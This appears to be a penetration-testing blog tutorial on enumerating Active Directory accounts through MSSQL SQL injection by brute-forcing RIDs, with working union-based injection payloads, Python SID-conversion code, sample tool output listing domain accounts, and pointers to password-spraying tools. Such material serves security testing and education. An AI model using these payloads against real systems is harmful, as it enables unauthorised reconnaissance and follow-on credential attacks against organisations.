---
layout: post
title: 'Active Directory Enumeration via MSSQL Injection'
date: '2020-03-22T12:00:00.000-00:00'
author: Keramas
tags: [active directory, sqli, penetration testing]
---

You found a SQL injection on an MSSQL server, but the functionality is limited, you can't execute commands, you can retrieve some user hashes out of a table, but they don't crack--you can even get a NTLMv2 hash using xp_dirtree, which also doesn't crack. All the data in the tables you see is pretty much useless. Now what?

Luckily, there is still plenty of potential for taking advantage of this vulnerability. Despite being a slightly older technique and piece of knowledge, it's possible to extract users, groups, and machine names from an Active Directory environment via SQL injection using RID bruteforcing. While this technique was [elaborated on by Scott Sutherland](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/) five years ago, it seems that many are unaware this is possible (including myself prior to coming across this great article). 

The principle is pretty simple:
- Find out the name of the domain
- Find out the SID of the domain
- Build user, group, and machine SIDs by iterating over a range of RIDs to determine names for each of the objects.

### What's a SID and RID?

A `security ID` or SID, is a unique string that Windows uses to identify and reference users, groups, and machine accounts. 

Example:
```
S-1-5-21-4142252318-1896537706-4233180933-1020
```
The `4142252318-1896537706-4233180933` portion uniquely identifies the domain or local computer, and the remaining value at the end (`1020`) is a RID, which is a `relative ID`. RIDs are assigned to any users, groups, or machine accounts which were created in a domain or local computer, and start from 1000. 

This means if we have the domain SID, we can iterate through a range of RIDs in order to make a complete user SID, and return back the plaintext name of what that SID identifies. 

## Overview

A full explanation of what all of this means is described completely in the referenced article, and is easy to digest, but the following is a less verbose overview using a simplified union-based SQL injection as an example. 

### Step 1. Find the name of the domain

Let's assume we have no knowledge of the domain name, we just happened to discover a union-based injection in an application, and determined the backend to be MSSQL. We've already determined the number of columns as well as the type of columns, and we are ready to inject to grab some data. First we will want to identify the name of the domain:

```
' union select 1,1,(select default_domain())--
```

### Step 2. Find out the SID of the domain

With knowledge of the domain name, we can then inject a query using a known built-in account or group (the following example just uses the `Administrator` account) to attain the SID value. Without any kind of typecasting, this returns a binary value, so we wrap it with `sys.fn_varbintohexstr` to make it something we can actually parse easily in the HTTP response.

```
' union select 1,1,(select sys.fn_varbintohexstr(SUSER_SID('{domain}\Administrator')))--
```

This value can be used as-is for subsequent queries, but we are going to convert it into a standard SID string to make it a bit easier. This can be accomplished through the following Python functions:

```python
#Modify the SID hex value retrieved from query 
def prepare_sid(sid):
    hex_string = bytes.fromhex(sid[2:])
    mod_sid = sid_to_str(hex_string)
    domain_sid_data = mod_sid.split('-')[:7]
    domain_sid = '-'.join(domain_sid_data) + "-"

    print(domain_sid+"\n")
    return domain_sid

#Build out the SID string
def sid_to_str(sid):
    if sys.version_info.major < 3:
        revision = ord(sid[0])
    else:
        revision = sid[0]

    if sys.version_info.major < 3:
        number_of_sub_ids = ord(sid[1])
    else:
        number_of_sub_ids = sid[1]
    iav = struct.unpack('>Q', b'\x00\x00' + sid[2:8])[0]
    sub_ids = [struct.unpack('<I', sid[8 + 4 * i:12 + 4 * i])[0]
               for i in range(number_of_sub_ids)]

    return 'S-{0}-{1}-{2}'.format(revision, iav, '-'.join([str(sub_id) for sub_id in sub_ids]))
```

### Step 4. Bruteforce RIDs to get Active Directory data

Now we can begin the bruteforcing of the RIDs to determine Active Directory data. We'll use the SID obtained from the previous step, and then iterate through numbers (i) beginning from 1000.

```
' union select 1,1,((SUSER_SNAME(SID_BINARY(N'{sid}{i}'))))--
```

### Step 5. Profit (hopefully)

The compiled results can then be put into a list which can be passed to tools such as o365spray, Kerbrute, Crackmapexec, etc. to perform password sprays, or could be used in conjunction with Impacket's GetNPUsers to determine ASREP-roastable accounts.

## Automation

While Metasploit already has a module that can yield this information through error-based queries, it is somewhat limited--especially for union-based injections and for times where you need to bypass WAFs. Naturally, if you are using Burp you can set up macros and other rules so you can encode payloads and such--but this becomes a bit too cumbersome to configure sometimes. 

As an alternative, I wrote both a Python script as well as a Burp Suite extender plugin called [MSSQLi-DUET](https://github.com/Keramas/mssqli-duet) to accomplish the above. They are far from perfect, but it is easy to add any kind of SQLmap tamper function to both and customize them as needed to fit the situation. With only a few test cases, there are likely times where this will not work right off the bat, so inspect what is going on with the injection and modify as necessary--the skeleton is there to do anything.

Full usage details can be found within the repository.

### Python script example:
```
python3 mssqli-duet.py -i "carbon'" -t 0 -rid 1000-1200 -p element -r testrequest.req -proxy 127.0.0.1:8080
[+] Collected request data:
Target URL = http://192.168.11.22/search2.php?element=carbon
Method = GET
Content-Type = applcation/x-www-form-urlencoded


[+] Determining the number of columns in the table...
        [!] Number of columns is  3
[+] Determining column type...
        [!] Column type is null
[+] Discovering domain name...
        [+] Domain = NEUTRINO
[+] Discovering domain SID...
S-1-5-21-4142252318-1896537706-4233180933-

[+] Enumerating Active Directory via SIDs...

NEUTRINO\HYDROGENDC01$
NEUTRINO\DnsAdmins
NEUTRINO\DnsUpdateProxy
NEUTRINO\HELIUM$
NEUTRINO\BORON$
NEUTRINO\BERYLLIUM$
NEUTRINO\aeinstein
NEUTRINO\bbobberson
NEUTRINO\csagan
NEUTRINO\ccheese
NEUTRINO\svc_web
NEUTRINO\svc_sql
```

### Burp plugin overview

<img src = "/assets/images/plugin-demo.gif">


## References and shoutouts
- [https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)

Shoutout to my coworkers `0xZDH` for troubleshooting code problems and `0xC01DF00D` for giving me a headstart on how to make my first GUI Burp plugin!